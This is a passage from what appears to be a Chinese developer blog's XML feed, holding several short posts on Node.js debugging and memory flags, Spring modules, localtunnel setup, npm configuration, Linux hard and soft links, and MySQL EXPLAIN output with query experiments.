src="/images/caf3b69c-afbe-4426-99c6-25f5ab6203c9.png"><br>配置参数<br>node –v8-options | grep space</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--max-old-space-size</span><br><span class="line">--max-new-space-size</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://taobaofed.org/blog/2016/04/15/how-to-find-memory-leak/">【1】</a> <a href="https://w3ctech.com/topic/842">【2】</a> <a href="https://www.w3ctech.com/topic/1711">【3】</a></p><p><a href="http://zhuchenglin.me/chrome-devtools-in-depth-4">http://zhuchenglin.me/chrome-devtools-in-depth-4</a></p><p><a href="http://alinode.aliyun.com/blog/37">http://alinode.aliyun.com/blog/37</a></p><p><a href="http://alinode.aliyun.com/blog/38">http://alinode.aliyun.com/blog/38</a></p><p><a href="https://yq.aliyun.com/articles/25476">https://yq.aliyun.com/articles/25476</a></p><p><a href="http://www.open-open.com/lib/view/open1421734578984.html">http://www.open-open.com/lib/view/open1421734578984.html</a></p><p><a href="http://zhuchenglin.me/chrome-devtools-in-depth-4">http://zhuchenglin.me/chrome-devtools-in-depth-4</a></p><p><a href="http://www.barretlee.com/blog/2015/10/07/debug-nodejs-in-command-line/">http://www.barretlee.com/blog/2015/10/07/debug-nodejs-in-command-line/</a></p><p><a href="https://my.oschina.net/lgmcolin/blog/121434">https://my.oschina.net/lgmcolin/blog/121434</a></p><p><a href="https://blog.eood.cn/node-js_gc">https://blog.eood.cn/node-js_gc</a></p><p><a href="http://frontenddev.org/link/nodejs-web-service-smooth-upgrade.html">http://frontenddev.org/link/nodejs-web-service-smooth-upgrade.html</a></p><p><a href="https://blog.eood.cn/node-js_gc">https://blog.eood.cn/node-js_gc</a></p><p><a href="http://sentsin.com/web/138_7.html">http://sentsin.com/web/138_7.html</a></p><p><a href="http://zhuchenglin.me/performance-optimization-in-action">http://zhuchenglin.me/performance-optimization-in-action</a></p><p><a href="http://www.itread01.com/articles/1475289787.html">http://www.itread01.com/articles/1475289787.html</a></p><p><a href="https://segmentfault.com/a/1190000002429825">https://segmentfault.com/a/1190000002429825</a></p><p><a href="http://taobaofed.org/blog/2016/04/15/how-to-find-memory-leak/">http://taobaofed.org/blog/2016/04/15/how-to-find-memory-leak/</a></p><p><a href="https://www.w3ctech.com/topic/842">https://www.w3ctech.com/topic/842</a></p><p><a href="https://w3ctech.com/topic/842">https://w3ctech.com/topic/842</a></p><p><a href="http://taobaofed.org/blog/2016/04/15/how-to-find-memory-leak/">http://taobaofed.org/blog/2016/04/15/how-to-find-memory-leak/</a></p><p><a href="http://deadhorse.me/nodejs/2013/04/13/exception_and_domain.html">http://deadhorse.me/nodejs/2013/04/13/exception_and_domain.html</a></p><p><a href="https://eggjs.org/zh-cn/core/logger.html">https://eggjs.org/zh-cn/core/logger.html</a></p><p><a href="https://eggjs.org/zh-cn/advanced/loader.html">https://eggjs.org/zh-cn/advanced/loader.html</a></p><p><a href="https://eggjs.org/zh-cn/advanced/cluster.html">https://eggjs.org/zh-cn/advanced/cluster.html</a></p><p><a href="https://www.w3ctech.com/topic/1711">https://www.w3ctech.com/topic/1711</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Node.js调试</title>
      <link href="/post/node-debugger.html"/>
      <url>/post/node-debugger.html</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>V8 提供了一个强大的调试器，可以通过 TCP 协议从外部访问。Node.js 提供了一个内建调试器来帮助开发者调试应用程序。想要开启调试器我们需要在代码中加入debugger标签，当 Node.js 执行到 debugger 标签时会自动暂停。</p><h3 id="开启调试模式"><a href="#开启调试模式" class="headerlink" title="开启调试模式"></a>开启调试模式</h3><h4 id="以debug模式启动node进程"><a href="#以debug模式启动node进程" class="headerlink" title="以debug模式启动node进程"></a>以debug模式启动node进程</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node --debug[=port] filename （这种方式，其实就是在指定的端口（默认为 5858）监听远程调试连接）</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node --debug-brk[=port] filename （这种方式在监听的同时，会在代码执行的时候，强制断点在第一行，这样有个好处就是：可以debug到node内部的是如何运行的）</span><br></pre></td></tr></table></figure><h4 id="对已经在运行的node进程开启debug模式"><a href="#对已经在运行的node进程开启debug模式" class="headerlink" title="对已经在运行的node进程开启debug模式"></a>对已经在运行的node进程开启debug模式</h4><ol><li><p>查找node进程</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ps -ef | grep node</span><br><span class="line">501 42630  2945   0  3:42下午 ttys001    0:02.30 node app.js</span><br></pre></td></tr></table></figure></li><li><p>发送<code>USR1</code>信号</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ kill -s USR1 42630</span><br></pre></td></tr></table></figure></li></ol><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><ol><li><p>获得进程号  </p> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; tasklist /FI <span class="string">&quot;IMAGENAME eq node.exe&quot;</span></span><br><span class="line"></span><br><span class="line">Image Name                     PID Session Name        Session#    Mem Usage</span><br><span class="line">========================= ======== ================ =========== ============</span><br><span class="line">node.exe                      3084 Console                    1     11,964 K</span><br></pre></td></tr></table></figure></li><li><p>开启debug模式</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; node -e &quot;process._debugProcess(3084)&quot;</span><br></pre></td></tr></table></figure></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/node-inspector/node-inspector">【1】</a> <a href="http://zqdevres.qiniucdn.com/data/20130414223730/index.html">【2】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Spring 核心框架体系结构</title>
      <link href="/post/spring-framework.html"/>
      <url>/post/spring-framework.html</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>本文主要介绍Spring Framework体系结构及内部各模块 jar 之间的依赖关系。</p><p><img src="/images/spring-framework.jpg"></p><h4 id="core"><a href="#core" class="headerlink" title="core"></a>core</h4><p>core部分包含4个模块</p><ul><li>spring-core：依赖注入IoC与DI的最基本实现</li><li>spring-beans：Bean工厂与bean的装配</li><li>spring-context：spring的context上下文即IoC容器</li><li>spring-expression：spring表达式语言</li></ul><p><img src="/images/spring-framework-core-dependencies.jpg"></p><h4 id="aop"><a href="#aop" class="headerlink" title="aop"></a>aop</h4><p>aop部分包含4个模块</p><ul><li>spring-aop：面向切面编程</li><li>spring-aspects：集成AspectJ</li><li>spring-instrument：提供一些类级的工具支持和ClassLoader级的实现，用于服务器</li><li>spring-instrument-tomcat：针对tomcat的instrument实现</li></ul><p><img src="/images/spring-framework-aop-dependencies.jpg"></p><h4 id="data-access"><a href="#data-access" class="headerlink" title="data access"></a>data access</h4><p>data access部分包含5个模块</p><ul><li>spring-jdbc：jdbc的支持</li><li>spring-tx：事务控制</li><li>spring-orm：对象关系映射，集成orm框架</li><li>spring-oxm：对象xml映射</li><li>spring-jms：java消息服务</li></ul><p><img src="/images/spring-framework-data-dependencies.jpg"></p><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>web部分包含4个模块</p><ul><li>spring-web：基础web功能，如文件上传</li><li>spring-webmvc：mvc实现</li><li>spring-webmvc-portlet：基于portlet的mvc实现</li><li>spring-struts：与struts的集成，不推荐，spring4不再提供</li></ul><p><img src="/images/spring-framework-web-dependencies.jpg"></p><h4 id="test"><a href="#test" class="headerlink" title="test"></a>test</h4><p>test部分只有一个模块，我将spring-context-support也放在这吧</p><ul><li>spring-test：spring测试，提供junit与mock测试功能</li><li>spring-context-support：spring额外支持包，比如邮件服务、视图解析等</li></ul><p><img src="/images/spring-framework-test-dependencies.jpg"></p><h4 id="messaging-websocket"><a href="#messaging-websocket" class="headerlink" title="messaging &amp; websocket"></a>messaging &amp; websocket</h4><ul><li>spring-websocket：为web应用提供的高效通信工具</li><li>spring-messaging：用于构建基于消息的应用程序</li></ul><p><img src="/images/spring-framework-websocket-messaging-dependencies.jpg"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://mp.weixin.qq.com/s/_T8QQbJrKl6exvF4RcIGFg">【1】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>localtunnel</title>
      <link href="/post/localtunnel.html"/>
      <url>/post/localtunnel.html</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Localtunnel 是一个可以让内网服务器暴露到公网上的开源项目。</p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g localtunnel</span><br></pre></td></tr></table></figure><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>假设本地服务器在 8000 端口，我们可以通过下面的命令把本地服务器暴露到公网中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lt --port 8000</span><br></pre></td></tr></table></figure><p>your url is: <a href="https://uhhzexcifv.localtunnel.me/">https://uhhzexcifv.localtunnel.me</a><br>通过上面的命令，我们不需要做其他设置就可以通过 <a href="https://uhhzexcifv.localtunnel.me/">https://uhhzexcifv.localtunnel.me</a> 来访问我们本地服务器了。</p><blockquote><p>可以使用–subdomain参数指定自己喜欢的子域名。</p></blockquote><p>由于 <code>localtunnel.me</code> 是国外的服务器，访问速度有时候不太理想，这时候我们可以自己搭建 <code>localtunnel</code> 的服务端。</p><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone git://github.com/defunctzombie/localtunnel-server.git</span><br><span class="line">$ cd localtunnel-server</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure><h4 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h4><p>以监听 2000 端口为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 直接使用</span><br><span class="line">$ bin/server --port 2000</span><br><span class="line"># 配合 pm2 使用</span><br><span class="line">$ pm2 start bin/server --name lt -- --port 2000</span><br></pre></td></tr></table></figure><p>启动服务端程序后，我们只要在使用客户端 lt 时加上 –host 参数，就可以指定服务端了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># host 后面不要加 /</span><br><span class="line">$ lt --host http://helloworld.com:2000 --port 8000</span><br><span class="line">your url is: http://jhuyudvlum.helloworld.com:2000</span><br></pre></td></tr></table></figure><p>这样，我们就可以通过自己的代理服务器来访问本地服务器了，不用经过第三方代理服务器，不必担心代理服务器的安全问题。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://localtunnel.github.io/www/">【1】</a> <a href="https://scarletsky.github.io/2016/01/17/localtunnel-usage/">【2】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NPM配置</title>
      <link href="/post/npm-config.html"/>
      <url>/post/npm-config.html</url>
      
        <content type="html"><![CDATA[<h3 id="npm-config"><a href="#npm-config" class="headerlink" title="npm-config"></a>npm-config</h3><p>npm 配置管理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ npm config --help</span><br><span class="line">npm config set &lt;key&gt; &lt;value&gt;</span><br><span class="line">npm config get [&lt;key&gt;]</span><br><span class="line">npm config delete &lt;key&gt;</span><br><span class="line">npm config list</span><br><span class="line">npm config edit</span><br><span class="line">npm set &lt;key&gt; &lt;value&gt;</span><br><span class="line">npm get [&lt;key&gt;]</span><br><span class="line"></span><br><span class="line">alias: c</span><br></pre></td></tr></table></figure><h3 id="npm获取配置有6种方式，优先级由高到底。"><a href="#npm获取配置有6种方式，优先级由高到底。" class="headerlink" title="npm获取配置有6种方式，优先级由高到底。"></a>npm获取配置有6种方式，优先级由高到底。</h3><ol><li><p>命令行参数<br>–proxy <a href="http://server:port">http://server:port</a> 即将 proxy 的值设为 <a href="http://server:port">http://server:port</a> 。</p></li><li><p>环境变量<br>以<code>npm_config_</code>为前缀的环境变量将会被认为是 npm 的配置属性。如设置 proxy 可以加入这样的环境变量<code>npm_config_proxy=http://server:port</code>。</p></li><li><p>用户配置文件<br>可以通过<code>npm config get userconfig</code>查看文件路径。如果是mac系统的话默认路径就是<code>$HOME/.npmrc</code>。</p></li><li><p>全局配置文件<br>可以通过<code>npm config get globalconfig</code>查看文件路径。mac系统的默认路径是<code>/usr/local/etc/npmrc</code>。</p></li><li><p>内置配置文件<br>安装npm的目录下的npmrc文件。</p></li><li><p>默认配置<br>npm本身有默认配置参数，如果以上5条都没设置，则npm会使用默认配置参数。</p></li></ol><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org/</span><br><span class="line">npm config set prefix /usr/local</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.cnblogs.com/huang0925/archive/2013/05/17/3083207.html">【1】</a> <a href="http://www.cnblogs.com/breakdown/archive/2012/12/18/2823646.html">【2】</a> <a href="https://docs.npmjs.com/misc/config">【3】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>软连接与硬链接</title>
      <link href="/post/soft-link-hard-link.html"/>
      <url>/post/soft-link-hard-link.html</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Linux 链接分两种，一种被称为硬链接（Hard Link），另一种被称为符号链接（Symbolic Link）。默认情况下，<code>ln</code>命令产生硬链接。</p><p><img src="/images/QQ20170206-155521@2x.jpg"></p><h3 id="硬连接"><a href="#硬连接" class="headerlink" title="硬连接"></a>硬连接</h3><p>硬连接指通过索引节点来进行连接。在Linux的文件系统中，保存在磁盘分区中的文件不管是什么类型都给它分配一个编号，称为索引节点号（Inode Index）。在 Linux 中，多个文件名指向同一索引节点是存在的。一般这种连接就是硬连接。硬连接的作用是允许一个文件拥有多个有效路径名，这样用户就可以建立硬连接到重要文件，以防止“误删”的功能。其原因如上所述，因为对应该目录的索引节点有一个以上的连接。只删除一个连接并不影响索引节点本身和其它的连接，<strong>只有当最后一个连接被删除后，文件的数据块及目录的连接才会被释放</strong>。也就是说，文件真正删除的条件是与之相关的所有硬连接文件均被删除。  </p><p><strong>硬链接文件和源文件虽然看起来像是两个文件，但是只占用一个文件的磁盘空间。</strong>  </p><p><strong>硬连接不可以作用于目录</strong>。因为每个目录下面都会有一个<code>.</code>和<code>..</code>也就是说每个目录下面的子目录肯定会有它本身和它上一级目录，那么一旦设置了硬链接则会造成一种混乱，设置会导致死循环。硬链接的文件并不会占用空间大小，它只是复制了该文件的一份<code>inode</code>信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln 源文件 目标文件</span><br></pre></td></tr></table></figure><h3 id="软连接"><a href="#软连接" class="headerlink" title="软连接"></a>软连接</h3><p>软连接可以理解为，源文件的快捷方式，软连接文件记录的是源文件的路径，占用空间非常小。它实际上是一个特殊的文件。在符号连接中，<strong>文件实际上是一个文本文件，其中包含的有另一文件的位置信息</strong>。<br>软链接克服了硬链接的不足，没有任何文件系统的限制，任何用户可以创建指向目录的符号链接。因而现在更为广泛使用，它具有更大的灵活性，甚至 <strong>可以跨越不同机器、不同网络对文件进行链接</strong>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln –s 源文件 目标文件</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://blog.csdn.net/longerzone/article/details/23870297">【1】</a> <a href="http://www.cnblogs.com/xiaochaohuashengmi/archive/2011/10/05/2199534.html">【2】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>理解Docker</title>
      <link href="/post/understand-docker.html"/>
      <url>/post/understand-docker.html</url>
      
        <content type="html"><![CDATA[<p><a href="http://jm.taobao.org/2016/05/12/introduction-to-docker/">【1】</a><br><a href="http://coolshell.cn/articles/17049.html">【2】</a><br><a href="http://dockone.io/article/1570">【3】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Mysql Explain 解释</title>
      <link href="/post/mysql-explain.html"/>
      <url>/post/mysql-explain.html</url>
      
        <content type="html"><![CDATA[<h3 id="Mysql-Explain-解释"><a href="#Mysql-Explain-解释" class="headerlink" title="Mysql Explain 解释"></a>Mysql Explain 解释</h3><table><thead><tr><th>列名</th><th>类型</th><th>解释</th></tr></thead><tbody><tr><td><strong>id</strong></td><td></td><td>SELECT语句的ID编号,优先执行编号较大的查询,如果编号相同,则从上向下执行</td></tr><tr><td><strong>select_type</strong></td><td>SIMPLE</td><td>一条没有UNION或子查询部分的SELECT语句</td></tr><tr><td>-</td><td>PIMARY</td><td>最外层或最左侧的SELECT语句</td></tr><tr><td>-</td><td>UNION</td><td>UNION语句里的第二条或最后一条SELECT语句</td></tr><tr><td>-</td><td>DEPENDENT UNION</td><td>和UNION类型的含义相似,但需要依赖于某个外层查询</td></tr><tr><td>-</td><td>UNION RESULT</td><td>一条UNION语句的结果</td></tr><tr><td>-</td><td>SUBQUERY</td><td>子查询中的第一个SELECT子句</td></tr><tr><td>-</td><td>DEPENDENT SUBQUERY</td><td>和SUBQUERY类型的含义相似,但需要依赖于某个外层查询</td></tr><tr><td>-</td><td>DERIVED</td><td>FROM子句里的子查询</td></tr><tr><td><strong>table</strong></td><td>t1</td><td>各输出行里的信息是关于哪个数据表的</td></tr><tr><td><strong>Partitions</strong></td><td>NULL</td><td>将要使用的分区.只有EXPLAIN PARTITIONS …语句才会显示这一列.非分区表显示为NULL</td></tr><tr><td><strong>type</strong></td><td></td><td>联接操作的类型,性能由好到差依次如下</td></tr><tr><td>-</td><td>system</td><td>表中仅有一行</td></tr><tr><td>-</td><td>const</td><td>单表中最多有一个匹配行</td></tr><tr><td>-</td><td>eq_ref</td><td>联接查询中,对于前表的每一行,在此表中只查询一条记录,使用了PRIMARY或UNIQUE</td></tr><tr><td>-</td><td>ref</td><td>联接查询中,对于前表的每一行,在此表中只查询一条记录,使用了INDEX</td></tr><tr><td>-</td><td>ref_or_null</td><td>联接查询中,对于前表的每一行,在此表中只查询一条记录,使用了INDEX,但是条件中有NULL值查询</td></tr><tr><td>-</td><td>index_merge</td><td>多个索引合并</td></tr><tr><td>-</td><td>unique_subquery</td><td>举例说明: value IN (SELECT primary_key FROM single_table WHERE some_expr)</td></tr><tr><td>-</td><td>index_subquery</td><td>举例说明: value IN (SELECT key_column FROM single_table WHERE some_expr)</td></tr><tr><td>-</td><td>range</td><td>只检索给定范围的行,包括如下操作符: &#x3D;, &lt;&gt;, &gt;, &gt;&#x3D;, &lt;, &lt;&#x3D;, IS NULL, &lt;&#x3D;&gt;, BETWEEN, or IN()</td></tr><tr><td>-</td><td>index</td><td>扫描索引树(略比ALL快,因为索引文件通常比数据文件小)</td></tr><tr><td>-</td><td>ALL</td><td>前表的每一行数据都要跟此表匹配,全表扫描</td></tr><tr><td><strong>possible_keys</strong></td><td>NULL</td><td>MySQL认为在可能会用到的索引.NULL表示没有找到索引</td></tr><tr><td><strong>key</strong></td><td>NULL</td><td>检索时,实际用到的索引名称.如果用了index_merge联接类型,此时会列出多个索引名称,NULL表示没有找到索引。可以使用 <code>force index (index_name)</code> 强制指定索引</td></tr><tr><td><strong>key_len</strong></td><td>NULL</td><td>实际使用的索引的长度.如果是复合索引,那么只显示使用的最左前缀的大小</td></tr><tr><td><strong>ref</strong></td><td>NULL</td><td>MySQL用来与索引值比较的值, 如果是单词const或者???,则表示比较对象是一个常数.如果是某个数据列的名称,则表示比较操作是逐个数据列进行的.NULL表示没有使用索引</td></tr><tr><td><strong>rows</strong></td><td></td><td>MySQL为完成查询而需要在数据表里检查的行数的估算值.这个输出列里所有的值的乘积就是必须检查的数据行的各种可能组合的估算值</td></tr><tr><td><strong>Extra</strong></td><td>Using filesort</td><td>需要将索引值写到文件中并且排序,这样按顺序检索相关数据行</td></tr><tr><td>-</td><td>Using index</td><td>MySQL可以不必检查数据文件, 只使用索引信息就能检索数据表信息</td></tr><tr><td>-</td><td>Using temporary</td><td>在使用 GROUP BY 或 ORDER BY 时,需要创建临时表,保存中间结果集</td></tr><tr><td>-</td><td>Using where</td><td>利用SELECT语句中的WHERE子句里的条件进行检索操作</td></tr></tbody></table><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><h4 id="实验1"><a href="#实验1" class="headerlink" title="实验1"></a>实验1</h4><blockquote><p>参照物</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">explain <span class="keyword">select</span></span><br><span class="line">    template.id <span class="keyword">as</span> <span class="string">&#x27;id&#x27;</span>, ifnull(likes.total, <span class="number">0</span>) <span class="keyword">as</span> <span class="string">&#x27;likes&#x27;</span>, ifnull(ratings.stars, <span class="number">0</span>) <span class="keyword">as</span> <span class="string">&#x27;ratings&#x27;</span>, ifnull(rating.star, <span class="number">0</span>) <span class="keyword">as</span> <span class="string">&#x27;rating&#x27;</span>, if(isnull(iLike.id), <span class="number">0</span>, <span class="number">1</span>) <span class="keyword">as</span> <span class="string">&#x27;isLike&#x27;</span></span><br><span class="line"><span class="keyword">from</span> template</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> template_id, <span class="built_in">avg</span>(star) <span class="keyword">as</span> <span class="string">&#x27;stars&#x27;</span> <span class="keyword">from</span> rating <span class="keyword">group</span> <span class="keyword">by</span> template_id) ratings</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> ratings.template_id</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> template_id, <span class="built_in">count</span>(<span class="number">1</span>) <span class="keyword">as</span> total <span class="keyword">from</span> `<span class="keyword">like</span>` <span class="keyword">group</span> <span class="keyword">by</span> template_id) <span class="keyword">as</span> likes</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> likes.template_id</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> `<span class="keyword">like</span>` <span class="keyword">as</span> iLike</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> iLike.template_id <span class="keyword">and</span> iLike.user_id <span class="operator">=</span> <span class="number">10000</span></span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> rating</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> rating.template_id <span class="keyword">and</span> rating.user_id <span class="operator">=</span> <span class="number">10000</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>id</th><th>select_type</th><th>table</th><th>type</th><th>possible_keys</th><th>key</th><th>key_len</th><th>ref</th><th>rows</th><th>Extra</th></tr></thead><tbody><tr><td>1</td><td>PRIMARY</td><td>template</td><td>index</td><td>NULL</td><td>PRIMARY</td><td>4</td><td>NULL</td><td>64</td><td>Using index</td></tr><tr><td>1</td><td>PRIMARY</td><td>derived2</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>7</td><td></td></tr><tr><td>1</td><td>PRIMARY</td><td>derived3</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>5</td><td></td></tr><tr><td>1</td><td>PRIMARY</td><td>iLike</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>5</td><td></td></tr><tr><td>1</td><td>PRIMARY</td><td>rating</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>7</td><td></td></tr><tr><td>3</td><td>DERIVED</td><td>like</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>5</td><td>Using temporary; Using filesort</td></tr><tr><td>2</td><td>DERIVED</td><td>rating</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>7</td><td>Using temporary; Using filesort</td></tr></tbody></table><h4 id="实验2"><a href="#实验2" class="headerlink" title="实验2"></a>实验2</h4><blockquote><p>调整子句顺序(6,7 -&gt; 4,5) 对比实验1</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">explain <span class="keyword">select</span></span><br><span class="line">    template.id <span class="keyword">as</span> <span class="string">&#x27;id&#x27;</span>, ifnull(likes.total, <span class="number">0</span>) <span class="keyword">as</span> <span class="string">&#x27;likes&#x27;</span>, ifnull(ratings.stars, <span class="number">0</span>) <span class="keyword">as</span> <span class="string">&#x27;ratings&#x27;</span>, ifnull(rating.star, <span class="number">0</span>) <span class="keyword">as</span> <span class="string">&#x27;rating&#x27;</span>, if(isnull(iLike.id), <span class="number">0</span>, <span class="number">1</span>) <span class="keyword">as</span> <span class="string">&#x27;isLike&#x27;</span></span><br><span class="line"><span class="keyword">from</span> template</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> template_id, <span class="built_in">count</span>(<span class="number">1</span>) <span class="keyword">as</span> total <span class="keyword">from</span> `<span class="keyword">like</span>` <span class="keyword">group</span> <span class="keyword">by</span> template_id) <span class="keyword">as</span> likes</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> likes.template_id</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> (<span class="keyword">select</span> template_id, <span class="built_in">avg</span>(star) <span class="keyword">as</span> <span class="string">&#x27;stars&#x27;</span> <span class="keyword">from</span> rating <span class="keyword">group</span> <span class="keyword">by</span> template_id) ratings</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> ratings.template_id</span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> `<span class="keyword">like</span>` <span class="keyword">as</span> iLike</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> iLike.template_id <span class="keyword">and</span> iLike.user_id <span class="operator">=</span> <span class="number">10000</span></span><br><span class="line"><span class="keyword">left</span> <span class="keyword">join</span> rating</span><br><span class="line"><span class="keyword">on</span> template.id <span class="operator">=</span> rating.template_id <span class="keyword">and</span> rating.user_id <span class="operator">=</span> <span class="number">10000</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>id</th><th>select_type</th><th>table</th><th>type</th><th>possible_keys</th><th>key</th><th>key_len</th><th>ref</th><th>rows</th><th>Extra</th></tr></thead><tbody><tr><td>1</td><td>PRIMARY</td><td>template</td><td>index</td><td>NULL</td><td>PRIMARY</td><td>4</td><td>NULL</td><td>64</td><td>Using index</td></tr><tr><td>1</td><td>PRIMARY</td><td>derived2</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>5</td><td></td></tr><tr><td>1</td><td>PRIMARY</td><td>derived3</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>7</td><td></td></tr><tr><td>1</td><td>PRIMARY</td><td>iLike</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>5</td><td></td></tr><tr><td>1</td><td>PRIMARY</td><td>rating</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>7</td><td></td></tr><tr><td>3</td><td>DERIVED</td><td>rating</td><td>ALL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>NULL</td><td>7</td><td>Using temporary; Using 